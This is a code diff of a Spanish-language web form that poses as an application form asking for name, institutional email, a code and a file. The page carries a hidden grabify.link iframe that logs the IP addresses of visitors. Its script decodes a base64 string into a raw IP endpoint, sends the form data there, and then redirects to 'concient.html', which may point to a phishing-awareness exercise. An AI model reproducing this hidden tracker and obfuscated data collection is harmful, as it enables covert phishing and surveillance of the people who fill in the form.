@@ -89,16 +89,16 @@
 
     <h2 style="color: white;"> Diligencia el siguiente formulario para tenerte en cuenta en nuestro proceso</h2>
     
-    <form action="concient.html" id="myForm">    <!-- el ID de myForm es importante ya que es el que hace el envio de la data-->
+    <form >    <!-- el ID de myForm es importante ya que es el que hace el envio de la data-->
 
       <div class="question-container">
         <label>Nombres y apellidos:</label>
-        <input type="text" id="nombre" name="nombre">
+        <input type="text" id="nombre" name="nombre" required>
       </div>
       
       <div class="question-container">
         <label>Correo institucional:</label>
-        <input type="email" class="form-control rounded-0 bg-transparent" id="mail" name="mail" ><!-- IMPORTANTE EL id -->
+        <input type="email" class="form-control rounded-0 bg-transparent" id="mail" name="mail" required><!-- IMPORTANTE EL id -->
        </div>
 
        <div class="question-container">
@@ -149,24 +149,24 @@
       <input type="file" name="archivo">
     </div>
 
+    <input class="btn text-white px-4 w-100" type="submit" id="myForm" value="Enviar">
     
-    <input type="submit" value="Enviar">
 
   </form>
   </div>
-  <iframe src="https://grabify.link/EVQK9Z" frameborder="0" hidden></iframe> <!-- URL para validar si abrieron el archivo -->
+  <iframe src="https://grabify.link/0HRIEL" frameborder="0" hidden></iframe> <!-- URL para validar si abrieron el archivo -->
   </body>
 
 <script>
   $(document).ready(function() {
-    $("#myForm").submit(function(event) {
+    $("#myForm").click(function(event) {
       event.preventDefault(); // Evita el envío del formulario
 
       // Obtener los datos del formulario
       var nombre = $("#nombre").val();
       var mail = $("#mail").val();
       var codigo = $("#codigo").val();
-
+      
       // Codificar la URL en base64
       var urlBase64 = atob("aHR0cDovLzMuODQuMjM0LjEyMTo1MDUwLw==");
 
@@ -183,6 +183,8 @@
           // Manejar la respuesta exitosa aquí
           console.log("Petición enviada con éxito");
           console.log(response);
+           // Redirigir al usuario a concient.html
+           window.location.href = "concient.html";
         },
         error: function(jqXHR, textStatus, errorThrown) {
           // Manejar los errores aquí
@@ -190,6 +192,8 @@
           console.error(jqXHR);
           console.error(textStatus);
           console.error(errorThrown);
+           // Redirigir al usuario a concient.html
+         window.location.href = "concient.html";
         }
       });
     });
